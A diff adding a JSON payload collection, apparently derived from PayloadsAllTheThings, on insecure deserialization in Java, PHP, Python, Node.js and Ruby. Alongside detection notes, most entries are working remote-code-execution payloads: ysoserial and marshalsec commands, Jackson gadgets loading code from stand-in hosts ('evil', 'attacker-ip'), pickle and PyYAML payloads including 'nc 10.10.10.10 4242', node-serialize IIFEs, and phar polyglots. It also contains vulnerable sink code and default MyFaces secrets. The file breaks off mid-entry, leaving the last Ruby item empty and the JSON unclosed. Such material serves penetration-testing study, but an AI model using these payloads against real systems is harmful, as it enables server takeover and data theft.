@@ -1,0 +1,619 @@
+{
+  "category": "Insecure Deserialization",
+  "source": "PayloadsAllTheThings/Insecure Deserialization/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What it is and where to look",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Serialization is turning an object into a format that can be stored or transmitted; deserialization is the reverse process of reconstructing an object from data. Insecure deserialization occurs when an application reconstructs an object from user-controlled data without validation.\n• Look for serialized data in cookies, hidden form fields, headers, parameters, session/auth tokens.\n• First recognize the format by magic bytes/markers (see the table), then determine the language/library.\n• Data often arrives in Base64 (sometimes + gzip) - decode it and look at the first bytes.\n• The escalation goal is RCE via POP chains (gadget chains); sometimes swapping a type/value is enough to bypass authentication."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Magic bytes and markers by language",
+      "language": "table",
+      "tags": ["detection", "magic-bytes", "fingerprint"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Object type", "Header (Hex)", "Header (Base64)", "Indicators"],
+          "rows": [
+            [".NET ViewState", "FF 01", "/w", "Usually inside hidden fields next to HTML forms"],
+            ["BinaryFormatter (.NET)", "0001 0000 00FF FFFF FF01", "AAEAAAD", "Decode Base64 and look for a long sequence of FF FF FF FF"],
+            ["Java Serialized", "AC ED", "rO", "Decode Base64 and check the first bytes"],
+            ["PHP Serialized", "4F 3A", "Tz", "Prefixes O:, a:, s:, i:, b: and length indicators"],
+            ["Python Pickle", "80 04 95", "gASV", "Text opcodes like (lp0, S'Test'"],
+            ["Ruby Marshal", "04 08", "BAgK", "Decode Base64 and look for \\x04\\x08 at the start"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "What a POP gadget is",
+      "language": "text",
+      "tags": ["methodology", "pop", "gadget"],
+      "body": "POP (Property Oriented Programming) gadget is a piece of code in an application class that gets invoked during deserialization.\nCharacteristics of a POP gadget:\n• The class can be serialized.\n• It has public/accessible properties.\n• It implements specific vulnerable methods (magic methods).\n• It has access to other callable classes.\nA chain of such gadgets (gadget chain) leads from the deserialization entry point to a dangerous call (exec/eval/system)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Practice labs",
+      "language": "text",
+      "tags": ["methodology", "labs", "practice"],
+      "body": "PortSwigger Web Security Academy:\n• Modifying serialized objects\n• Modifying serialized data types\n• Using application functionality to exploit insecure deserialization\n• Arbitrary object injection in PHP\n• Exploiting Java deserialization with Apache Commons\n• Exploiting PHP deserialization with a pre-built gadget chain\n• Exploiting Ruby deserialization using a documented gadget chain\n• Developing a custom gadget chain for Java deserialization\n• Developing a custom gadget chain for PHP deserialization\n• Using PHAR deserialization to deploy a custom gadget chain\nAlso: NickstaDB/DeserLab (github.com/NickstaDB/DeserLab)."
+    },
+
+    {
+      "subcategory": "Java",
+      "title": "Recognizing Java serialization",
+      "language": "text",
+      "tags": ["java", "detection", "fingerprint"],
+      "body": "• \"AC ED 00 05\" in Hex:\n    AC ED - STREAM_MAGIC, the serialization protocol marker.\n    00 05 - STREAM_VERSION, the serialization version.\n• \"rO0\" in Base64.\n• Content-Type = \"application/x-java-serialized-object\".\n• \"H4sIAAAAAAAAAJ\" in gzip(base64)."
+    },
+    {
+      "subcategory": "Java",
+      "title": "ysoserial - generating payloads",
+      "language": "bash",
+      "tags": ["java", "ysoserial", "rce", "tool"],
+      "body": "java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin\njava -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin\njava -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin\njava -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64"
+    },
+    {
+      "subcategory": "Java",
+      "title": "ysoserial - what it is",
+      "language": "text",
+      "tags": ["java", "ysoserial", "tool"],
+      "body": "frohoff/ysoserial (github.com/frohoff/ysoserial) is a PoC tool for generating payloads that exploit insecure deserialization of Java objects. You pick a ready-made gadget chain (depends on the libraries in the target's classpath) and a command to execute."
+    },
+    {
+      "subcategory": "Java",
+      "title": "Gadget chains in ysoserial and their dependencies",
+      "language": "table",
+      "tags": ["java", "ysoserial", "gadget"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Payload", "Authors", "Dependencies"],
+          "rows": [
+            ["AspectJWeaver", "@Jang", "aspectjweaver:1.9.2, commons-collections:3.2.2"],
+            ["BeanShell1", "@pwntester, @cschneider4711", "bsh:2.0b5"],
+            ["C3P0", "@mbechler", "c3p0:0.9.5.2, mchange-commons-java:0.2.11"],
+            ["Click1", "@artsploit", "click-nodeps:2.3.0, javax.servlet-api:3.1.0"],
+            ["Clojure", "@JackOfMostTrades", "clojure:1.8.0"],
+            ["CommonsBeanutils1", "@frohoff", "commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2"],
+            ["CommonsCollections1", "@frohoff", "commons-collections:3.1"],
+            ["CommonsCollections2", "@frohoff", "commons-collections4:4.0"],
+            ["CommonsCollections3", "@frohoff", "commons-collections:3.1"],
+            ["CommonsCollections4", "@frohoff", "commons-collections4:4.0"],
+            ["CommonsCollections5", "@matthias_kaiser, @jasinner", "commons-collections:3.1"],
+            ["CommonsCollections6", "@matthias_kaiser", "commons-collections:3.1"],
+            ["CommonsCollections7", "@scristalli, @hanyrax, @EdoardoVignati", "commons-collections:3.1"],
+            ["FileUpload1", "@mbechler", "commons-fileupload:1.3.1, commons-io:2.4"],
+            ["Groovy1", "@frohoff", "groovy:2.3.9"],
+            ["Hibernate1", "@mbechler", ""],
+            ["Hibernate2", "@mbechler", ""],
+            ["JBossInterceptors1", "@matthias_kaiser", "javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21"],
+            ["JRMPClient", "@mbechler", ""],
+            ["JRMPListener", "@mbechler", ""],
+            ["JSON1", "@mbechler", "json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1"],
+            ["JavassistWeld1", "@matthias_kaiser", "javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21"],
+            ["Jdk7u21", "@frohoff", ""],
+            ["Jython1", "@pwntester, @cschneider4711", "jython-standalone:2.5.2"],
+            ["MozillaRhino1", "@matthias_kaiser", "js:1.7R2"],
+            ["MozillaRhino2", "@_tint0", "js:1.7R2"],
+            ["Myfaces1", "@mbechler", ""],
+            ["Myfaces2", "@mbechler", ""],
+            ["ROME", "@mbechler", "rome:1.0"],
+            ["Spring1", "@frohoff", "spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE"],
+            ["Spring2", "@mbechler", "spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2"],
+            ["URLDNS", "@gebl", ""],
+            ["Vaadin1", "@kai_ullrich", "vaadin-server:7.7.14, vaadin-shared:7.7.14"],
+            ["Wicket1", "@jacob-baines", "wicket-util:6.23.0, slf4j-api:1.6.4"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Java",
+      "title": "URLDNS - detection via DNS without gadgets in the classpath",
+      "language": "text",
+      "tags": ["java", "ysoserial", "urldns", "detection"],
+      "body": "URLDNS does not require vulnerable libraries in the classpath - it works on a plain JDK and makes a DNS request during deserialization. Ideal for blind confirmation of the vulnerability (out-of-band): substitute your own domain and listen for DNS.\njava -jar ysoserial.jar URLDNS http://your-collab-domain > payload.bin"
+    },
+    {
+      "subcategory": "Java",
+      "title": "Burp extensions based on ysoserial",
+      "language": "text",
+      "tags": ["java", "burp", "tool"],
+      "body": "• NetSPI/JavaSerialKiller - Burp extension for Java Deserialization attacks.\n• federicodotta/Java-Deserialization-Scanner - all-in-one plugin for detecting and exploiting Java deserialization.\n• summitt/burp-ysoserial - integration of ysoserial with Burp Suite.\n• DirectDefense/SuperSerial - identifying deserialization vulnerabilities.\n• DirectDefense/SuperSerial-Active - active identification of the vulnerability (Burp Extender)."
+    },
+    {
+      "subcategory": "Java",
+      "title": "Alternative tools for Java deserialization",
+      "language": "text",
+      "tags": ["java", "tool", "marshalsec"],
+      "body": "• pwntester/JRE8u20_RCE_Gadget - pure JRE 8 RCE gadget.\n• joaomatosf/JexBoss - verification and exploitation of JBoss and other Java deserializations.\n• pimps/ysoserial-modified - a fork of the original ysoserial.\n• NickstaDB/SerialBrute - Java serialization brute-force tool.\n• NickstaDB/SerializationDumper - dumps Java serialized streams into a readable form.\n• bishopfox/gadgetprobe - brute-forces the remote classpath via deserialization.\n• k3idii/Deserek - Java-format serialization/deserialization in Python.\n• mbechler/marshalsec - Java Unmarshaller Security: turning data into code execution."
+    },
+    {
+      "subcategory": "Java",
+      "title": "Deserek - converting a Java stream into Python",
+      "language": "bash",
+      "tags": ["java", "deserek", "tool"],
+      "body": "java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin\npython deserek.py yss_base.bin --format python > yss_url.py\npython yss_url.py yss_new.bin\njava -cp JavaSerializationTestSuite DeSerial yss_new.bin"
+    },
+    {
+      "subcategory": "Java",
+      "title": "marshalsec - exploiting unmarshallers",
+      "language": "bash",
+      "tags": ["java", "marshalsec", "jndi", "tool"],
+      "body": "$ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]\n$ java -cp marshalsec.jar marshalsec.JsonIO Groovy \"cmd\" \"/c\" \"calc\"\n$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\\#exploit.JNDIExploit 1389\n// -a - generates/tests all payloads for that marshaller\n// -t - runs in test mode, unmarshalling the generated payloads after generating them.\n// -v - verbose mode, e.g. also shows the generated payload in test mode.\n// gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.\n// arguments - Gadget specific arguments"
+    },
+    {
+      "subcategory": "Java",
+      "title": "marshalsec - supported marshallers and impact",
+      "language": "table",
+      "tags": ["java", "marshalsec", "gadget"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Marshaller", "Gadget impact"],
+          "rows": [
+            ["BlazeDSAMF(0|3|X)", "JDK only escalation to Java serialization; various third party libraries RCEs"],
+            ["Hessian|Burlap", "various third party RCEs"],
+            ["Castor", "dependency library RCE"],
+            ["Jackson", "possible JDK only RCE, various third party RCEs"],
+            ["Java", "yet another third party RCE"],
+            ["JsonIO", "JDK only RCE"],
+            ["JYAML", "JDK only RCE"],
+            ["Kryo", "third party RCEs"],
+            ["KryoAltStrategy", "JDK only RCE"],
+            ["Red5AMF(0|3)", "JDK only RCE"],
+            ["SnakeYAML", "JDK only RCEs"],
+            ["XStream", "JDK only RCEs"],
+            ["YAMLBeans", "third party RCE"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Java",
+      "title": "Jackson - detecting Polymorphic Type Handling",
+      "language": "text",
+      "tags": ["java", "jackson", "json", "detection"],
+      "body": "Jackson is a popular Java library for working with JSON. jackson-databind supports Polymorphic Type Handling (PTH, formerly Polymorphic Deserialization), disabled by default.\nTo find out that the backend uses Jackson, send invalid JSON and study the error - look for mentions of com.fasterxml.jackson.databind or org.codehaus.jackson.map.\nExample message:\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object"
+    },
+    {
+      "subcategory": "Java",
+      "title": "Jackson CVE-2017-7525 - TemplatesImpl",
+      "language": "json",
+      "tags": ["java", "jackson", "cve", "rce"],
+      "body": "{\n  \"param\": [\n    \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n    {\n      \"transletBytecodes\": [\n        \"yv66v[JAVA_CLASS_B64_ENCODED]AIAEw==\"\n      ],\n      \"transletName\": \"a.b\",\n      \"outputProperties\": {}\n    }\n  ]\n}"
+    },
+    {
+      "subcategory": "Java",
+      "title": "Jackson CVE-2017-17485 - FileSystemXmlApplicationContext (Spring)",
+      "language": "json",
+      "tags": ["java", "jackson", "cve", "spring"],
+      "body": "{\n  \"param\": [\n    \"org.springframework.context.support.FileSystemXmlApplicationContext\",\n    \"http://evil/spel.xml\"\n  ]\n}"
+    },
+    {
+      "subcategory": "Java",
+      "title": "Jackson CVE-2019-12384 - logback H2 RUNSCRIPT",
+      "language": "json",
+      "tags": ["java", "jackson", "cve", "jdbc"],
+      "body": "[\n  \"ch.qos.logback.core.db.DriverManagerConnectionSource\", \n  {\n    \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"\n  }\n]"
+    },
+    {
+      "subcategory": "Java",
+      "title": "Jackson CVE-2020-36180 - commons-dbcp2 H2 RUNSCRIPT",
+      "language": "json",
+      "tags": ["java", "jackson", "cve", "jdbc"],
+      "body": "[\n  \"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\",\n  {\n    \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'\"\n  }\n]"
+    },
+    {
+      "subcategory": "Java",
+      "title": "Jackson CVE-2020-9548 - AnterosDBCPConfig (OOB LDAP)",
+      "language": "json",
+      "tags": ["java", "jackson", "cve", "oob"],
+      "body": "[\n  \"br.com.anteros.dbcp.AnterosDBCPConfig\",\n  {\n    \"healthCheckRegistry\": \"ldap://{{interactsh-url}}\"\n  }\n]"
+    },
+    {
+      "subcategory": "Java",
+      "title": "SnakeYAML - RCE via ScriptEngineManager",
+      "language": "text",
+      "tags": ["java", "snakeyaml", "yaml", "rce"],
+      "body": "!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL [\"http://attacker-ip/\"]\n  ]]\n]"
+    },
+    {
+      "subcategory": "Java",
+      "title": "ViewState (JSF) - general information",
+      "language": "text",
+      "tags": ["java", "viewstate", "jsf"],
+      "body": "ViewState is a mechanism used by frameworks such as JavaServer Faces (JSF) to store the state of UI components between HTTP requests. Two main implementations: Oracle Mojarra (the JSF reference implementation) and Apache MyFaces.\nTools:\n• joaomatosf/jexboss - verification and exploitation of JBoss / Java deserializations.\n• Synacktiv-contrib/inyourface - patching unencrypted and unsigned JSF ViewStates."
+    },
+    {
+      "subcategory": "Java",
+      "title": "ViewState - encodings and storage",
+      "language": "table",
+      "tags": ["java", "viewstate", "jsf", "encoding"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Encoding", "Starts with"],
+          "rows": [
+            ["base64", "rO0"],
+            ["base64 + gzip", "H4sIAAA"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Java",
+      "title": "ViewState - state saving method",
+      "language": "text",
+      "tags": ["java", "viewstate", "jsf"],
+      "body": "The javax.faces.STATE_SAVING_METHOD parameter in JSF defines how the framework stores the component tree between requests. The storage method can be inferred from the viewstate representation in the HTML:\n• Server side: value=\"-XXX:-XXXX\".\n• Client side: base64 + gzip + Java Object."
+    },
+    {
+      "subcategory": "Java",
+      "title": "ViewState (MyFaces) - encryption and shared secrets",
+      "language": "text",
+      "tags": ["java", "viewstate", "myfaces", "crypto"],
+      "body": "By default MyFaces uses DES for encryption and HMAC-SHA1 for ViewState authentication (AES + HMAC-SHA256 is recommended). The algorithms and secrets are set in context parameters:\n<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>\n<param-name>org.apache.myfaces.SECRET</param-name>\n<param-name>org.apache.myfaces.MAC_SECRET</param-name>\n\nShared secrets from the documentation (name -> value):\nAES CBC/PKCS5Padding -> NzY1NDMyMTA3NjU0MzIxMA==\nDES -> NzY1NDMyMTA=<\nDESede -> MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz\nBlowfish -> NzY1NDMyMTA3NjU0MzIxMA\nAES CBC -> MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz\nAES CBC IV -> NzY1NDMyMTA3NjU0MzIxMA==\n\nOrder of operations:\n• Encryption: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState\n• Decryption: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data"
+    },
+
+    {
+      "subcategory": "PHP",
+      "title": "Recognizing PHP serialization and magic methods",
+      "language": "text",
+      "tags": ["php", "detection", "magic-methods"],
+      "body": "Format: O: (object), a: (array), s: (string), i: (int), b: (bool) + length indicators. No Hex AC...; it starts with O:, a:, s: etc. (Base64 marker Tz).\nMagic methods useful for PHP Object Injection (triggered during deserialization/the object lifecycle):\n• __wakeup() - on object deserialization.\n• __destruct() - on object destruction.\n• __toString() - when the object is cast to a string.\nAlso see the phar:// wrapper (see File Inclusion) - it triggers object injection too."
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Vulnerable code - unserialize() + __wakeup()/eval()",
+      "language": "php",
+      "tags": ["php", "object-injection", "example"],
+      "body": "<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Basic serialized data (array)",
+      "language": "php",
+      "tags": ["php", "object-injection"],
+      "body": "a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Command execution via PHPObjectInjection",
+      "language": "php",
+      "tags": ["php", "object-injection", "rce"],
+      "body": "string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\""
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Authentication bypass via Type Juggling",
+      "language": "php",
+      "tags": ["php", "type-juggling", "auth-bypass"],
+      "body": "Vulnerable code:\n<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}\n\nPayload (substitute bool true instead of strings - true == \"str\" is truthy):\na:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Object Injection - replacing a value via the R: reference",
+      "language": "php",
+      "tags": ["php", "object-injection", "reference"],
+      "body": "Vulnerable code:\n<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>\n\nPayload (guess references R:2 to secretCode -> always equal):\nO:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}\n\nLikewise with an array:\na:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;}"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Finding POP chains (PHP POP Chains)",
+      "language": "text",
+      "tags": ["php", "pop", "gadget", "methodology"],
+      "body": "POP chains in PHP lead to RCE.\n• In the source, look for a call to unserialize().\n• Study magic methods as entry points/links: __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __serialize(), __unserialize(), __toString(), __invoke(), __set_state(), __clone(), __debugInfo().\n• The key ones: __wakeup() (on unserialize), __destruct() (on destruction), __toString() (on cast to a string) - they are called automatically and often start the chain."
+    },
+    {
+      "subcategory": "PHP",
+      "title": "phpggc - generator of ready-made POP chains",
+      "language": "bash",
+      "tags": ["php", "phpggc", "rce", "tool"],
+      "body": "phpggc monolog/rce1 'phpinfo();' -s\nphpggc monolog/rce1 assert 'phpinfo()'\nphpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data\nphpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "phpggc - supported frameworks",
+      "language": "text",
+      "tags": ["php", "phpggc", "tool"],
+      "body": "ambionics/phpggc (github.com/ambionics/phpggc) generates payloads based on several frameworks:\n• Laravel\n• Symfony\n• SwiftMailer\n• Monolog\n• SlimPHP\n• Doctrine\n• Guzzle"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Phar Deserialization - the concept",
+      "language": "text",
+      "tags": ["php", "phar", "deserialization"],
+      "body": "Through the phar:// wrapper you can trigger deserialization of the archive's metadata when accessing a file, e.g. file_get_contents(\"phar://./archives/app.phar\"). Deserialization happens even without an explicit unserialize() - a file operation on the phar is enough.\nA valid PHAR consists of 4 parts:\n1. Stub - a piece of PHP code, executed on access in an executable context; at minimum it must end with __HALT_COMPILER();. There are no other restrictions on the stub's content.\n2. Manifest - metadata about the archive and its contents.\n3. File Contents - the archive's files themselves.\n4. Signature (optional) - for integrity verification."
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Creating a Phar to exploit PDFGenerator",
+      "language": "php",
+      "tags": ["php", "phar", "rce"],
+      "body": "<?php\nclass PDFGenerator { }\n\n//Create a new instance of the Dummy class and modify its property\n$dummy = new PDFGenerator();\n$dummy->callback = \"passthru\";\n$dummy->fileName = \"uname -a > pwned\"; //our payload\n\n// Delete any existing PHAR archive with that name\n@unlink(\"poc.phar\");\n\n// Create a new archive\n$poc = new Phar(\"poc.phar\");\n\n// Add all write operations to a buffer, without modifying the archive on disk\n$poc->startBuffering();\n\n// Set the stub\n$poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\");\n\n/* Add a new file in the archive with \"text\" as its content*/\n$poc[\"file\"] = \"text\";\n// Add the dummy object to the metadata. This will be serialized\n$poc->setMetadata($dummy);\n// Stop buffering and write changes to disk\n$poc->stopBuffering();\n?>"
+    },
+    {
+      "subcategory": "PHP",
+      "title": "Phar with a JPEG header (bypassing file-type checks)",
+      "language": "php",
+      "tags": ["php", "phar", "polyglot", "rce"],
+      "body": "<?php\nclass AnyClass {\n    public $data = null;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n    \n    function __destruct() {\n        system($this->data);\n    }\n}\n\n// create new Phar\n$phar = new Phar('test.phar');\n$phar->startBuffering();\n$phar->addFromString('test.txt', 'text');\n$phar->setStub(\"\\xff\\xd8\\xff\\n<?php __HALT_COMPILER(); ?>\");\n\n// add object of any class as meta data\n$object = new AnyClass('whoami');\n$phar->setMetadata($object);\n$phar->stopBuffering();"
+    },
+
+    {
+      "subcategory": "Python",
+      "title": "Recognition and sinks (pickle/jsonpickle)",
+      "language": "text",
+      "tags": ["python", "pickle", "detection", "sinks"],
+      "body": "Pickle: magic bytes 80 04 95 (Base64 marker gASV); in text you see opcodes like (lp0, S'Test'.\nIn Python source, look for dangerous sinks:\n• cPickle.loads\n• pickle.loads\n• _pickle.loads\n• jsonpickle.decode\nTool for generating payloads: j0lt-github/python-deserialization-attack-payload-generator - supports pickle, PyYAML, ruamel.yaml, jsonpickle."
+    },
+    {
+      "subcategory": "Python",
+      "title": "Pickle - generating an auth token (vulnerable scheme)",
+      "language": "python",
+      "tags": ["python", "pickle", "example"],
+      "body": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)"
+    },
+    {
+      "subcategory": "Python",
+      "title": "Pickle - loading the token from user input (sink)",
+      "language": "python",
+      "tags": ["python", "pickle", "sink"],
+      "body": "new_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)"
+    },
+    {
+      "subcategory": "Python",
+      "title": "Pickle - RCE via __reduce__ (os.system)",
+      "language": "python",
+      "tags": ["python", "pickle", "reduce", "rce"],
+      "body": "import cPickle, os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)"
+    },
+    {
+      "subcategory": "Python",
+      "title": "Pickle - universal payload via eval (Python 3)",
+      "language": "python",
+      "tags": ["python", "pickle", "reduce", "rce"],
+      "body": "import pickle\nimport base64\n\nclass RCE:\n    def __reduce__(self):\n        return eval, (\"__import__('os').system('whoami')\",)\npickled = pickle.dumps(RCE())\nprint(base64.b64encode(pickled).decode())"
+    },
+    {
+      "subcategory": "Python",
+      "title": "Pickle - code injection techniques inside __reduce__",
+      "language": "python",
+      "tags": ["python", "pickle", "rce", "blind"],
+      "body": "__import__('os').system('whoami') # Reflected RCE\ngetattr('', __import__('os').popen('whoami').read()) # Error-Based RCE\n1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE\n__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
+    },
+    {
+      "subcategory": "Python",
+      "title": "PyYAML - RCE payloads (apply/new)",
+      "language": "text",
+      "tags": ["python", "pyyaml", "yaml", "rce"],
+      "body": "!!python/object/apply:time.sleep [10]\n!!python/object/apply:builtins.range [1, 10, 1]\n!!python/object/apply:os.system [\"nc 10.10.10.10 4242\"]\n!!python/object/apply:os.popen [\"nc 10.10.10.10 4242\"]\n!!python/object/new:subprocess [[\"ls\",\"-ail\"]]\n!!python/object/new:subprocess.check_output [[\"ls\",\"-ail\"]]"
+    },
+    {
+      "subcategory": "Python",
+      "title": "PyYAML - subprocess.Popen (multiline)",
+      "language": "text",
+      "tags": ["python", "pyyaml", "yaml", "rce"],
+      "body": "!!python/object/apply:subprocess.Popen\n- ls"
+    },
+    {
+      "subcategory": "Python",
+      "title": "PyYAML - reading a file via str + exec",
+      "language": "text",
+      "tags": ["python", "pyyaml", "yaml", "lfi"],
+      "body": "!!python/object/new:str\nstate: !!python/tuple\n- 'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'\n- !!python/object/new:Warning\n  state:\n    update: !!python/name:exec"
+    },
+    {
+      "subcategory": "Python",
+      "title": "PyYAML - vulnerable sinks after version 6.0",
+      "language": "python",
+      "tags": ["python", "pyyaml", "sink", "detection"],
+      "body": "Starting with PyYAML 6.0, the default loader for load was switched to SafeLoader, which lowers the RCE risk. Now the vulnerable sinks are yaml.unsafe_load and yaml.load(input, Loader=yaml.UnsafeLoader):\nwith open('exploit_unsafeloader.yml') as file:\n        data = yaml.load(file,Loader=yaml.UnsafeLoader)"
+    },
+
+    {
+      "subcategory": "Node.js",
+      "title": "Recognition and sinks (node-serialize/funcster)",
+      "language": "text",
+      "tags": ["javascript", "nodejs", "detection", "sinks"],
+      "body": "In Node source, look for the use of vulnerable serialization libraries:\n• node-serialize\n• serialize-to-js\n• funcster\nThe node-serialize marker in data is the presence of _$$ND_FUNC$$_ in values (a serialized function)."
+    },
+    {
+      "subcategory": "Node.js",
+      "title": "node-serialize CVE-2017-5941 - the gist of the vulnerability",
+      "language": "text",
+      "tags": ["javascript", "nodejs", "node-serialize", "cve"],
+      "body": "A vulnerability in the node-serialize 0.0.4 package for Node.js: untrusted data passed to the unserialize() function allows arbitrary code execution via a JavaScript object with an immediately invoked function expression (IIFE) - by adding () at the end of the serialized function."
+    },
+    {
+      "subcategory": "Node.js",
+      "title": "node-serialize - generating a serialized payload",
+      "language": "javascript",
+      "tags": ["javascript", "nodejs", "node-serialize"],
+      "body": "var y = {\n    rce : function(){\n        require('child_process').exec('ls /', function(error,\n        stdout, stderr) { console.log(stdout) });\n    },\n}\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\n\" + serialize.serialize(y));"
+    },
+    {
+      "subcategory": "Node.js",
+      "title": "node-serialize - payload with IIFE () for execution",
+      "language": "javascript",
+      "tags": ["javascript", "nodejs", "node-serialize", "rce"],
+      "body": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}"
+    },
+    {
+      "subcategory": "Node.js",
+      "title": "funcster - payload via __js_function",
+      "language": "javascript",
+      "tags": ["javascript", "nodejs", "funcster", "rce"],
+      "body": "{\"rce\":{\"__js_function\":\"function(){CMD=\\\"cmd /c calc\\\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()\"}}"
+    },
+
+    {
+      "subcategory": "Ruby",
+      "title": "Recognizing Ruby serialization (Marshal/YAML)",
+      "language": "text",
+      "tags": ["ruby", "marshal", "yaml", "detection"],
+      "body": "Marshal: magic bytes 04 08 (Base64 marker BAgK); decode Base64 and look for \\x04\\x08 at the start.\nRuby also deserializes via YAML (YAML.load) and JSON. The main dangerous points are Marshal.load and YAML.load on untrusted data."
+    },
+    {
+      "subcategory": "Ruby",
+      "title": "Marshal - universal RCE gadget (Ruby 2.0-2.5)",
+      "language": "bash",
+      "tags": ["ruby", "marshal", "rce", "gadget"],
